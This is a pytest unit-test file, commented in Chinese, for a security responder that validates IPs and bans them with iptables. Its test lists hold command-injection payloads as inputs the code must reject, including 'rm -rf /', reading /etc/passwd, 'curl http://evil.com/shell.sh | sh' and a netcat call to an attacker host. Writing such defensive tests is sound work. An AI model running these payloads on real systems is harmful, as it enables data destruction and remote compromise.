"""
Phase 5 防护响应层 - 单元测试
对应架构文档 §6 / Phase 5 提示词验收标准

运行方式：
    cd ai-security-guardian
    python -m pytest tests/test_responder.py -v

测试覆盖：
    - validate_ip()：合法 / 非法 / 命令注入 payload / 空值 / 非字符串
    - SecurityResponder 分级响应：normal / low / medium / high / critical
    - dry_run 模式：不实际调用 subprocess
    - 命令注入防御：恶意 IP 不会被传递到 subprocess.run()
    - 重复封禁：同一 IP 只封一次
    - 解封：从 _banned_ips 中移除记录
"""
from __future__ import annotations

import logging
import os
import subprocess
import sys
from datetime import datetime, timedelta
from unittest.mock import MagicMock, patch

import pytest

PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), os.pardir))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from src.detectors.base import DetectionResult  # noqa: E402
from src.response.notifier import AlertNotifier, NotificationChannel, NotifyAttempt  # noqa: E402
from src.response.responder import SecurityResponder, validate_ip  # noqa: E402


# =====================================================================
# 辅助：快速构造 DetectionResult
# =====================================================================
def _make_result(
    threat_level: str,
    source_ip: str = "10.0.0.1",
    threat_type: str = "web_attack",
    confidence: float = 0.9,
    details: str = "test",
) -> DetectionResult:
    return DetectionResult(
        threat_type=threat_type,
        threat_level=threat_level,
        confidence=confidence,
        details=details,
        source_ip=source_ip,
    )


# =====================================================================
# 1. IP 地址严格校验
# =====================================================================
class TestValidateIP:
    """验证 validate_ip() 对各种输入的处理。"""

    @pytest.mark.parametrize(
        "ip",
        [
            "192.168.1.1",
            "10.0.0.1",
            "0.0.0.0",
            "255.255.255.255",
            "127.0.0.1",
            "8.8.8.8",
            "  192.168.1.1  ",  # 前后空格需能正常 strip
        ],
    )
    def test_legal_ips_pass(self, ip):
        assert validate_ip(ip) is True

    @pytest.mark.parametrize(
        "ip",
        [
            "256.1.1.1",
            "999.1.1.1",
            "1.1.1",
            "1.1.1.1.1",
            "abc.def.ghi.jkl",
            "",
            "   ",
            None,
            123,
            ["1.2.3.4"],
            {"ip": "1.2.3.4"},
            "1.2.3.4; rm -rf /",
            "1.2.3.4 | cat /etc/passwd",
            "$(whoami)",
            "`cat /etc/passwd`",
            "1.2.3.4 && reboot",
            "1.2.3.4;iptables -F",
            "<script>alert(1)</script>",
        ],
    )
    def test_illegal_ips_rejected(self, ip):
        assert validate_ip(ip) is False


# =====================================================================
# 2. 分级响应策略
# =====================================================================
class TestRespondLevels:
    """验证 respond() 对不同威胁等级的执行路径。"""

    def test_normal_no_action(self):
        responder = SecurityResponder(dry_run=True)
        with patch.object(responder, "_log_only") as log, \
                patch.object(responder, "_notify") as alert, \
                patch.object(responder, "_ban_for_level") as ban, \
                patch.object(responder, "_isolate_for_critical") as iso:
            responder.respond(
                DetectionResult(
                    threat_type="normal",
                    threat_level="low",
                    confidence=1.0,
                    details="ok",
                )
            )
            log.assert_not_called()
            alert.assert_not_called()
            ban.assert_not_called()
            iso.assert_not_called()

    def test_low_log_only(self):
        responder = SecurityResponder(dry_run=True)
        with patch.object(responder, "_log_only") as log, \
                patch.object(responder, "_notify") as alert, \
                patch.object(responder, "_ban_for_level") as ban, \
                patch.object(responder, "_isolate_for_critical") as iso:
            responder.respond(_make_result("low"))
            log.assert_called_once()
            alert.assert_not_called()
            ban.assert_not_called()
            iso.assert_not_called()

    def test_medium_log_and_alert(self):
        responder = SecurityResponder(dry_run=True)
        with patch.object(responder, "_log_only") as log, \
                patch.object(responder, "_notify") as alert, \
                patch.object(responder, "_ban_for_level") as ban, \
                patch.object(responder, "_isolate_for_critical") as iso:
            responder.respond(_make_result("medium"))
            log.assert_called_once()
            alert.assert_called_once()
            ban.assert_not_called()
            iso.assert_not_called()

    def test_high_log_alert_ban(self):
        responder = SecurityResponder(dry_run=True)
        with patch.object(responder, "_log_only") as log, \
                patch.object(responder, "_notify") as alert, \
                patch.object(responder, "_ban_for_level") as ban, \
                patch.object(responder, "_isolate_for_critical") as iso:
            responder.respond(_make_result("high"))
            log.assert_called_once()
            alert.assert_called_once()
            ban.assert_called_once()
            # 封禁时长应为 1 小时
            _args, kwargs = ban.call_args
            assert kwargs.get("duration") == timedelta(hours=1)
            iso.assert_not_called()

    def test_critical_log_alert_ban_isolate(self):
        responder = SecurityResponder(dry_run=True)
        with patch.object(responder, "_log_only") as log, \
                patch.object(responder, "_notify") as alert, \
                patch.object(responder, "_ban_for_level") as ban, \
                patch.object(responder, "_isolate_for_critical") as iso:
            responder.respond(_make_result("critical"))
            log.assert_called_once()
            alert.assert_called_once()
            ban.assert_called_once()
            iso.assert_called_once()
            # critical 封禁时长应为 1 天
            _args, kwargs = ban.call_args
            assert kwargs.get("duration") == timedelta(days=1)


# =====================================================================
# 3. dry_run 模式：不实际执行 subprocess
# =====================================================================
class TestDryRun:
    """dry_run=True 时，防火墙操作只打印日志，不调用 subprocess。"""

    def test_ban_ip_dry_run_no_subprocess(self):
        responder = SecurityResponder(dry_run=True)
        with patch("src.response.firewall.subprocess.run") as mock_run:
            responder._ban_ip("10.0.0.1", duration=timedelta(hours=1))
            mock_run.assert_not_called()
        assert responder.is_banned("10.0.0.1")

    def test_unban_ip_dry_run_no_subprocess(self):
        responder = SecurityResponder(dry_run=True)
        responder._ban_ip("10.0.0.1", duration=timedelta(hours=1))
        with patch("src.response.firewall.subprocess.run") as mock_run:
            responder.unban_ip("10.0.0.1")
            mock_run.assert_not_called()
        assert not responder.is_banned("10.0.0.1")

    def test_non_dry_run_invokes_subprocess(self):
        responder = SecurityResponder(dry_run=False)
        with patch("src.response.firewall.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)
            responder._ban_ip("192.0.2.10", duration=timedelta(hours=1))
            mock_run.assert_called_once()
            called_args = mock_run.call_args
            cmd_arg = called_args.args[0]
            # 必须是列表（禁止字符串 + shell=True）
            assert isinstance(cmd_arg, list)
            assert cmd_arg == ["iptables", "-A", "INPUT", "-s", "192.0.2.10", "-j", "DROP"]
            # 必须带 timeout
            assert called_args.kwargs.get("timeout") is not None
            # 严禁 shell=True
            assert called_args.kwargs.get("shell", False) is False


# =====================================================================
# 4. 命令注入防御（核心安全测试）
# =====================================================================
class TestCommandInjectionDefense:
    """
    关键安全测试：构造各类恶意 IP，验证：
        1. validate_ip 拒绝
        2. _ban_ip 不会将恶意值传入 subprocess.run
        3. _banned_ips 不会记录非法 IP
    """

    MALICIOUS_IPS = [
        "1.2.3.4; rm -rf /",
        "1.2.3.4 && curl http://evil.com/shell.sh | sh",
        "$(whoami)",
        "`cat /etc/passwd`",
        "1.2.3.4|nc attacker 4444",
        "1.2.3.4\nrm -rf /",
        "../../../etc/passwd",
        "256.256.256.256",
        "",
        None,
    ]

    @pytest.mark.parametrize("malicious_ip", MALICIOUS_IPS)
    def test_ban_ip_rejects_malicious(self, malicious_ip):
        responder = SecurityResponder(dry_run=False)
        with patch("src.response.firewall.subprocess.run") as mock_run:
            responder._ban_ip(malicious_ip, duration=timedelta(hours=1))
            mock_run.assert_not_called()
        assert len(responder.banned_ips) == 0

    @pytest.mark.parametrize("malicious_ip", MALICIOUS_IPS)
    def test_unban_ip_rejects_malicious(self, malicious_ip):
        responder = SecurityResponder(dry_run=False)
        with patch("src.response.firewall.subprocess.run") as mock_run:
            responder.unban_ip(malicious_ip)
            mock_run.assert_not_called()

    @pytest.mark.parametrize("malicious_ip", MALICIOUS_IPS)
    def test_isolate_host_rejects_malicious(self, malicious_ip):
        responder = SecurityResponder(dry_run=False)
        # 不应抛异常、也不应进入 critical 日志分支
        responder._isolate_host(malicious_ip)

    def test_respond_with_malicious_ip_does_not_execute(self, caplog):
        """端到端：high 级别 + 恶意 IP -> 拒绝封禁。"""
        responder = SecurityResponder(dry_run=False)
        result = _make_result("high", source_ip="1.2.3.4; rm -rf /")
        with patch("src.response.firewall.subprocess.run") as mock_run, \
                caplog.at_level(logging.WARNING, logger="src.response.responder"):
            responder.respond(result)
            mock_run.assert_not_called()
        assert "无法自动封禁" in caplog.text or "降级" in caplog.text
        assert len(responder.banned_ips) == 0
        acts = [a for a in responder.response_actions if a.get("action") == "ban_ip"]
        assert acts and acts[-1].get("status") == "skipped"


# =====================================================================
# 5. 重复封禁
# =====================================================================
class TestDuplicateBan:
    def test_duplicate_ban_skipped_in_dry_run(self):
        responder = SecurityResponder(dry_run=True)
        responder._ban_ip("10.0.0.5", duration=timedelta(hours=1))
        first_time = responder.banned_ips["10.0.0.5"]
        # 再次封禁不应更新记录
        responder._ban_ip("10.0.0.5", duration=timedelta(hours=2))
        assert responder.banned_ips["10.0.0.5"] == first_time

    def test_duplicate_ban_skipped_in_real_mode(self):
        responder = SecurityResponder(dry_run=False)
        with patch("src.response.firewall.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)
            responder._ban_ip("192.0.2.5", duration=timedelta(hours=1))
            responder._ban_ip("192.0.2.5", duration=timedelta(hours=1))
            # subprocess.run 只应被调用 1 次
            assert mock_run.call_count == 1
            dup = [a for a in responder.response_actions if a.get("reason") == "already_banned"]
            assert dup


# =====================================================================
# 6. 解封
# =====================================================================
class TestUnban:
    def test_unban_removes_from_banned_ips(self):
        responder = SecurityResponder(dry_run=True)
        responder._ban_ip("10.0.0.9", duration=timedelta(hours=1))
        assert responder.is_banned("10.0.0.9")
        responder.unban_ip("10.0.0.9")
        assert not responder.is_banned("10.0.0.9")
        assert "10.0.0.9" not in responder.banned_ips

    def test_false_positive_rollback_records_operator_and_reason(self):
        responder = SecurityResponder(dry_run=True)
        responder._ban_ip("10.0.0.10", duration=timedelta(hours=1))
        responder.rollback_ban("10.0.0.10", operator="analyst-a", reason="false_positive")
        assert not responder.is_banned("10.0.0.10")
        rows = [a for a in responder.response_actions if a.get("action") == "unban_ip"]
        assert rows
        assert rows[-1]["operator"] == "analyst-a"
        assert rows[-1]["trigger_source"] == "manual"
        assert rows[-1]["reason"] == "rollback:false_positive"

    def test_unban_uses_list_form_command(self):
        responder = SecurityResponder(dry_run=False)
        responder._banned_ips["192.0.2.9"] = datetime.now()  # 预置记录
        with patch("src.response.firewall.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)
            responder.unban_ip("192.0.2.9")
            mock_run.assert_called_once()
            cmd_arg = mock_run.call_args.args[0]
            assert isinstance(cmd_arg, list)
            assert cmd_arg == ["iptables", "-D", "INPUT", "-s", "192.0.2.9", "-j", "DROP"]
            assert mock_run.call_args.kwargs.get("shell", False) is False


# =====================================================================
# 7. subprocess 异常处理
# =====================================================================
class TestSubprocessExceptions:
    """验证三类异常都被捕获，且不会导致程序崩溃。"""

    def test_called_process_error_handled(self, caplog):
        responder = SecurityResponder(dry_run=False)
        with patch("src.response.firewall.subprocess.run") as mock_run, \
                caplog.at_level(logging.ERROR, logger="src.response.firewall"):
            mock_run.side_effect = subprocess.CalledProcessError(1, ["iptables"])
            responder._ban_ip("192.0.2.21", duration=timedelta(hours=1))
        assert "封禁失败" in caplog.text or "执行失败" in caplog.text
        # 失败时不应进入 _banned_ips
        assert "192.0.2.21" not in responder.banned_ips

    def test_timeout_expired_handled(self, caplog):
        responder = SecurityResponder(dry_run=False)
        with patch("src.response.firewall.subprocess.run") as mock_run, \
                caplog.at_level(logging.ERROR, logger="src.response.firewall"):
            mock_run.side_effect = subprocess.TimeoutExpired(["iptables"], 5)
            responder._ban_ip("192.0.2.22", duration=timedelta(hours=1))
        assert "封禁失败" in caplog.text or "超时" in caplog.text
        assert "192.0.2.22" not in responder.banned_ips

    def test_file_not_found_handled(self, caplog):
        responder = SecurityResponder(dry_run=False)
        with patch("src.response.firewall.subprocess.run") as mock_run, \
                caplog.at_level(logging.ERROR, logger="src.response.firewall"):
            mock_run.side_effect = FileNotFoundError()
            responder._ban_ip("192.0.2.23", duration=timedelta(hours=1))
        assert "iptables" in caplog.text
        assert "192.0.2.23" not in responder.banned_ips


# =====================================================================
# 8. Web 高危告警 dry-run：响应动作记录含 source_ip
# =====================================================================
class TestWebAttackResponseActions:
    def test_high_web_dry_run_records_ban_with_source_ip(self):
        responder = SecurityResponder(dry_run=True)
        result = _make_result("high", source_ip="192.0.2.55")
        responder.respond(result)
        ban_rows = [a for a in responder.response_actions if a.get("action") == "ban_ip"]
        assert ban_rows, "expected ban_ip response actions"
        last = ban_rows[-1]
        assert last.get("status") == "dry_run_simulated"
        assert last.get("source_ip") == "192.0.2.55"
        assert last.get("dry_run") is True
        assert last.get("iptables_cmd")

    def test_high_web_missing_ip_records_degraded_skip(self):
        responder = SecurityResponder(dry_run=True)
        result = _make_result("high", source_ip="")
        responder.respond(result)
        ban_rows = [a for a in responder.response_actions if a.get("action") == "ban_ip"]
        assert ban_rows
        assert ban_rows[-1].get("status") == "skipped"
        assert ban_rows[-1].get("reason") == "missing_source_ip"

    def test_business_whitelist_protects_from_auto_ban(self, monkeypatch):
        monkeypatch.setenv("RESPONSE_BUSINESS_IP_WHITELIST", "192.0.2.66")
        responder = SecurityResponder(dry_run=True)
        responder.respond(_make_result("high", source_ip="192.0.2.66"))
        assert not responder.is_banned("192.0.2.66")
        ban_rows = [a for a in responder.response_actions if a.get("action") == "ban_ip"]
        assert ban_rows
        assert ban_rows[-1].get("status") == "skipped"
        assert "whitelist" in ban_rows[-1].get("reason", "")

    def test_notify_failure_records_status_and_schedules_retry(self):
        class FailingChannel(NotificationChannel):
            name = "failing"

            def send(self, subject, body, *, meta=None):
                return NotifyAttempt(self.name, False, "boom")

        notifier = AlertNotifier(
            [FailingChannel()],
            max_retries=1,
            retry_backoff_sec=0.0,
            sleep_fn=lambda _s: None,
        )
        responder = SecurityResponder(dry_run=True, notifier=notifier)
        responder.respond(_make_result("medium", source_ip="192.0.2.67"))
        rows = [a for a in responder.response_actions if a.get("action") == "notify"]
        assert rows
        assert rows[-1]["status"] == "failed"
        assert rows[-1]["reason"] == "all_notification_channels_failed"
        assert rows[-1]["operator"] == "security_responder"
        assert responder.scheduler._mem_tasks  # noqa: SLF001


# =====================================================================
# 9. banned_ips 属性返回浅拷贝
# =====================================================================
class TestBannedIPsView:
    def test_banned_ips_returns_copy(self):
        responder = SecurityResponder(dry_run=True)
        responder._ban_ip("10.0.0.1", duration=timedelta(hours=1))
        view = responder.banned_ips
        view.clear()
        # 外部清空不应影响内部状态
        assert responder.is_banned("10.0.0.1")
